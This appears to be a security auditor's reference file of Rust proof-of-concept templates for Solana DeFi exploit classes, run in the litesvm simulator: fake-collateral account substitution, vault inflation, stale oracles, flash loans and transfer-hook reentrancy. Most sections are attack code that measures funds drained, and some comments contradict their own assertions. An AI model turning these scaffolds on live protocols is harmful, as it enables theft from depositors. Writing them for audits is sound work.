# PoC Templates by Vector Class

Class-specific PoC scaffolds. For each major exploit class, the structure of the PoC and the key assertions to make. Use as a starting point; adapt to specific protocol.

The base scaffolding (Cargo.toml, litesvm setup, ATA helpers) is in `poc-templates.md`. This file assumes that's already in place and shows the attack-specific code.

## Vector — Account substitution (Cashio class)

**Attack**: pass an attacker-controlled account where a validated account was expected.

```rust
// Setup phase
let attacker = Keypair::new();
let svm = setup_protocol(&mut svm);

// Create the legitimate collateral (attacker's funds in this case)
let real_collateral = create_legitimate_collateral(&mut svm, &attacker, 100);  // $100

// Create the FAKE collateral — a token account with attacker as owner
// but not derived from the protocol's expected source
let fake_collateral = Keypair::new();
let fake_amount = 1_000_000_000u64;  // attacker claims $1B "fake collateral"

// Manually create the fake account with attacker-supplied data
let mut data = vec![0u8; 165];
// Write: mint = legitimate mint, owner = attacker, amount = fake_amount
data[0..32].copy_from_slice(&legitimate_mint.to_bytes());
data[32..64].copy_from_slice(&attacker.pubkey().to_bytes());
data[64..72].copy_from_slice(&fake_amount.to_le_bytes());
data[108] = 1;  // initialized

// Inject this account directly into svm (bypasses real init)
svm.set_account(
    fake_collateral.pubkey(),
    Account {
        lamports: rent_exempt_for(165),
        data,
        owner: spl_token::ID,  // claims to be SPL token
        executable: false,
        rent_epoch: 0,
    },
).unwrap();

// Now call the protocol's mint instruction with fake_collateral
let attacker_balance_before = get_token_balance(&svm, &attacker_stable_ata);

let ix = build_mint_stable_ix(
    program_id,
    attacker.pubkey(),
    fake_collateral.pubkey(),  // <-- the bug: fake account passed
    attacker_stable_ata,
    legitimate_mint,
);

let tx = Transaction::new_signed_with_payer(
    &[ix],
    Some(&attacker.pubkey()),
    &[&attacker],
    svm.latest_blockhash(),
);

let result = svm.send_transaction(tx);

// If the bug exists: tx succeeds, attacker has minted fake_amount of stable
let attacker_balance_after = get_token_balance(&svm, &attacker_stable_ata);

println!("Attacker stable balance BEFORE: {}", attacker_balance_before);
println!("Attacker stable balance AFTER:  {}", attacker_balance_after);
println!("MINTED FROM FAKE: {} (= ${})", 
    attacker_balance_after - attacker_balance_before,
    (attacker_balance_after - attacker_balance_before) / 1_000_000  // assuming 6 decimals
);

assert!(attacker_balance_after >= attacker_balance_before + fake_amount,
    "Mint should have succeeded with fake collateral");
```

**Key assertions**:
- `tx.is_ok()` — the malicious tx is accepted
- `attacker_balance_after - attacker_balance_before >= fake_amount` — the unauthorized mint happened

## Vector — Vault first-deposit inflation

```rust
let attacker = Keypair::new();
let victim = Keypair::new();
fund(&mut svm, &attacker, 1_000_000);  // 1 lamport ATA + a bit for fees
fund(&mut svm, &victim, 100_000_000);   // $100 victim deposit

// Step 1: attacker deposits 1 wei
let attacker_shares_before = svm_simulate_share_balance(&attacker);
deposit_into_vault(&mut svm, &attacker, 1).unwrap();
let attacker_shares_after_deposit = svm_simulate_share_balance(&attacker);
assert_eq!(attacker_shares_after_deposit - attacker_shares_before, 1);  // 1:1 first depositor

// Step 2: attacker direct-transfers a large amount to vault (bypassing deposit)
let inflation_amount = 100_000_000u64;  // $100 inflation
direct_transfer_to_vault(&mut svm, &attacker, inflation_amount);

// Step 3: vault state now: 1 share, vault holds 1 + 100M tokens
let vault_balance = read_vault_balance(&svm);
let total_shares = read_total_shares(&svm);
println!("After inflation: vault has {} tokens, {} shares", vault_balance, total_shares);

// Step 4: victim deposits $100M
let victim_amount = 100_000_000u64;
let victim_balance_before = get_token_balance(&svm, &victim_underlying_ata);

deposit_into_vault(&mut svm, &victim, victim_amount).unwrap();

let victim_shares = read_user_shares(&svm, &victim);
println!("Victim received {} shares for {} deposit", victim_shares, victim_amount);

// shares = victim_amount * total_shares / vault_balance
//        = 100M * 1 / 100M+1
//        ≈ 0 (rounds down to 0)
// So victim has 0 shares, attacker has 1 share, vault holds 200M

// Step 5: attacker withdraws their 1 share
let attacker_balance_before_withdraw = get_token_balance(&svm, &attacker_underlying_ata);
withdraw_from_vault(&mut svm, &attacker, 1).unwrap();
let attacker_balance_after_withdraw = get_token_balance(&svm, &attacker_underlying_ata);

let extracted = attacker_balance_after_withdraw - attacker_balance_before_withdraw;
println!("Attacker extracted: {} (= ${})", extracted, extracted / 1_000_000);
println!("Net profit: {} - {} = {}", extracted, inflation_amount, extracted - inflation_amount);

// Should be ~victim_amount - 1 (the inflation comes back, plus most of victim's deposit)
assert!(extracted > inflation_amount + victim_amount / 2,
    "Inflation attack should drain majority of victim deposit");
```

## Vector — Oracle staleness

```rust
// Setup: lending protocol with Pyth oracle for SOL/USD
let pyth_oracle = setup_pyth_mock(&mut svm, INITIAL_PRICE);

// Attacker opens position with collateral at price P1
let attacker_collat = 100_000_000_000u64; // 100 SOL in lamports
let initial_price_dollars = 100; // $100/SOL
deposit_collateral(&mut svm, &attacker, attacker_collat).unwrap();

let attacker_borrow = 50 * 100_000_000; // borrow $50/SOL × 100 SOL × 0.5 LTV ÷ ... = 5000 USDC
borrow(&mut svm, &attacker, attacker_borrow).unwrap();

// Time passes, real price drops to $20/SOL but oracle isn't updated
// (in real attack, attacker exploits the gap before oracle updates)
let stale_oracle_price = 100; // oracle still shows $100
let real_price = 20;

// Without proper staleness check, attacker can do:
// 1. Repay loan at low borrow value (calculated using stale price)
// 2. Withdraw collateral at high collateral value (calculated using stale price)
// Net: extract value because oracle says collateral is worth more than it is

// Specific attack flow depends on protocol, but generic:
let withdrawal_value = withdraw_collateral_using_stale_oracle(&mut svm, &attacker);
// withdrawal_value calculated as collat * stale_price = 100 SOL × $100 = $10000
// Real value: 100 SOL × $20 = $2000
// Difference: $8000 extracted

println!("Stale oracle valuation: ${}", withdrawal_value);
println!("Real value:            ${}", attacker_collat / 1_000_000_000 * real_price);
```

This requires either:
- A way to actually trigger the oracle staleness (e.g., advance clock without advancing oracle)
- A mock oracle program that you can manipulate

For litesvm, you typically deploy a mock pyth program and write to it directly to simulate the gap.

## Vector — fee_growth_inside desync (CLMM)

```rust
// Setup CLMM pool with attacker LP position
let pool = init_pool(&mut svm, ...);
let position = open_position_centered_on_current_tick(&mut svm, &attacker, ...);

// Attacker performs operations that update fee_growth_inside without proper synchronization
// Specific to the bug — example:

// 1. Some swap occurs, fee_growth_outside_lower or _upper updates
swap(&mut svm, ...);

// 2. Attacker calls some handler that should reset checkpoints but doesn't
update_position_in_buggy_way(&mut svm, &attacker, &position).unwrap();

// 3. Next collect_fees uses stale checkpoints
let fees_owed_before = read_position_fees_owed(&svm, &position);
collect_fees(&mut svm, &attacker, &position).unwrap();
let fees_owed_after = read_position_fees_owed(&svm, &position);

let claimed = fees_collected_to_attacker_ata(&svm, &attacker);
println!("Position fees_owed before collect: {}", fees_owed_before);
println!("Fees actually transferred:        {}", claimed);
println!("Excess (bug evidence):            {}", claimed - fees_owed_before);

// Or alternatively: the attack is double-claim
// Run collect_fees twice, expect second to fail or return 0
let first = read_attacker_balance_then_collect();
let second = read_attacker_balance_then_collect();
assert!(second > first, "Double-claim should have given more on 2nd call");
```

## Vector — Two-handler invariant desync

Generic structure:

```rust
// Pre-state: invariant holds
let invariant_before = compute_invariant(&svm);
assert!(invariant_holds(invariant_before));

// Call handler A
call_handler_a(&mut svm, &attacker).unwrap();

// Call handler B — this should preserve invariant but doesn't
call_handler_b(&mut svm, &attacker).unwrap();

// Invariant violated
let invariant_after = compute_invariant(&svm);
println!("Invariant before: {:?}", invariant_before);
println!("Invariant after:  {:?}", invariant_after);
assert!(!invariant_holds(invariant_after), "Invariant should be violated");

// Exploit the violation
let extracted = exploit_violated_state(&mut svm, &attacker);
println!("Extracted: {}", extracted);
```

## Vector — Flash loan asymmetry

```rust
let attacker_initial = 1000;  // $1000 starting capital

// Step 1: Flash borrow large amount
let flash_amount = 10_000_000;  // $10M flash loan
flash_borrow(&mut svm, &attacker, flash_amount).unwrap();

// Step 2: Use the borrowed amount to manipulate something
// E.g., dump into thin pool to move oracle, or use as collateral elsewhere
manipulate_state(&mut svm, &attacker, flash_amount);

// Step 3: Capture profit (e.g., liquidate self at favorable price, drain reward, etc.)
let profit = capture_profit(&mut svm, &attacker);

// Step 4: Repay flash loan + fee
let fee = flash_amount / 1000; // 0.1% fee
flash_repay(&mut svm, &attacker, flash_amount + fee).unwrap();

// Step 5: Verify net profit
let final_balance = get_balance(&svm, &attacker);
let net = final_balance as i64 - attacker_initial as i64;
println!("Started with: {}", attacker_initial);
println!("Ended with:   {}", final_balance);
println!("Net profit:   {}", net);

assert!(net > 0, "Flash loan attack should be profitable");
```

The key for flash loan PoCs: pack everything into ONE transaction. If multi-tx, the flash loan invariant doesn't hold — it's not really a flash loan.

## Vector — CPI reentrancy via Token-2022 transfer hook

```rust
// Setup: deploy attacker's transfer hook program
let hook_program = deploy_hook_program(&mut svm);

// Create a Token-2022 mint with the hook configured
let mint = create_token_2022_mint_with_hook(&mut svm, &hook_program);

// Setup victim protocol that accepts this token
let protocol = init_protocol_accepting_token2022(&mut svm, &mint);

// Attacker opens a position
deposit_token2022(&mut svm, &attacker, amount).unwrap();

// Attacker triggers a withdraw — during the transfer, hook re-enters
let attacker_balance_before = get_token_balance(&svm, &attacker);

// The withdraw triggers transfer_checked → invokes hook → hook calls back into protocol
withdraw(&mut svm, &attacker, amount).unwrap();

// If reentrancy worked, attacker withdrew twice
let attacker_balance_after = get_token_balance(&svm, &attacker);

println!("Withdrew: {}", attacker_balance_after - attacker_balance_before);
println!("Expected: {} (single withdraw)", amount);
assert!(attacker_balance_after - attacker_balance_before > amount,
    "Reentrancy should have allowed double withdraw");
```

This requires deploying a custom transfer hook program that does the malicious callback. Complex but real.

## Vector — Discriminator collision (rare)

```rust
// Find two account types in same program with same discriminator
// (this is rare but happens with custom Anchor namespaces)

let position_disc = anchor_lang::solana_program::hash::hash(b"account:Position").to_bytes()[0..8];
let other_disc = anchor_lang::solana_program::hash::hash(b"account:OtherType").to_bytes()[0..8];

if position_disc == other_disc {
    // Bug! Construct an OtherType account that the program will deserialize as Position
    let mut data = vec![0u8; 200];
    data[0..8].copy_from_slice(&other_disc);
    // Fill in the rest as Position would expect, but with attacker-favorable values
    
    let fake_account = Keypair::new();
    svm.set_account(fake_account.pubkey(), ...);
    
    // Pass fake_account where Position is expected, exploit
}
```

## General PoC structure for any vector

```rust
fn main() {
    // === SETUP PHASE ===
    let mut svm = LiteSVM::new();
    svm.add_program(program_id, include_bytes!("../target/program.so"));
    
    let attacker = setup_actor(&mut svm, "attacker", initial_funds);
    let victim   = setup_actor(&mut svm, "victim", victim_funds);
    
    initialize_protocol(&mut svm);
    
    // === PRE-STATE ===
    let attacker_before = read_attacker_state(&svm);
    let protocol_before = read_protocol_state(&svm);
    println!("=== BEFORE EXPLOIT ===");
    println!("Attacker: {:?}", attacker_before);
    println!("Protocol: {:?}", protocol_before);
    
    // === ATTACK PHASE ===
    println!("\n=== EXECUTING ATTACK ===");
    let result = execute_attack(&mut svm, &attacker, &victim);
    if let Err(e) = result {
        panic!("Attack failed (PoC busted): {:?}", e);
    }
    
    // === POST-STATE ===
    let attacker_after = read_attacker_state(&svm);
    let protocol_after = read_protocol_state(&svm);
    println!("\n=== AFTER EXPLOIT ===");
    println!("Attacker: {:?}", attacker_after);
    println!("Protocol: {:?}", protocol_after);
    
    // === IMPACT QUANTIFICATION ===
    let extracted = compute_extraction(&attacker_before, &attacker_after);
    let damage = compute_damage(&protocol_before, &protocol_after);
    println!("\n=== IMPACT ===");
    println!("Attacker extracted: {} (= ${} USD)", extracted, dollar_value(extracted));
    println!("Protocol damage:    {} (= ${} USD)", damage, dollar_value(damage));
    println!("CU consumed:        {}", get_cu_used(&svm));
    
    // === ASSERTION ===
    assert!(extracted > THRESHOLD, "Exploit should extract value");
    println!("\n✓ PoC SUCCEEDED");
}
```

This template is adaptable to any vector. The principle: setup → pre-state → attack → post-state → quantify impact → assert.
